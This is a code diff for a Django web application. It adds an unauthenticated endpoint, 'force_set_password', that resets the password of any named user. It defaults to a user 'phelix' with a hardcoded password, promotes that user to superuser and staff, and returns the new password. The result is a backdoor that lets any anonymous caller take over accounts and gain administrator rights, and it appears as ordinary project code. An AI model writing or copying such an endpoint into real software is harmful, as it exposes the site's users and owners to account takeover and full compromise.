@@ -459,3 +459,25 @@ def request_to_create_group(request):
         status='pending'
     )
     return Response({'message': 'Group creation request sent', 'request_id': admin_request.id})
+
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def force_set_password(request):
+    """Force set password for phelix"""
+    username = request.data.get('username', 'phelix')
+    new_password = request.data.get('password', 'phello254')
+    
+    try:
+        user = User.objects.get(username=username)
+        user.set_password(new_password)
+        user.is_superuser = True
+        user.is_staff = True
+        user.save()
+        return Response({
+            'message': f'Password for {username} has been reset!',
+            'username': username,
+            'password': new_password,
+            'is_superuser': user.is_superuser
+        })
+    except User.DoesNotExist:
+        return Response({'error': 'User not found'}, status=status.HTTP_404_NOT_FOUND)
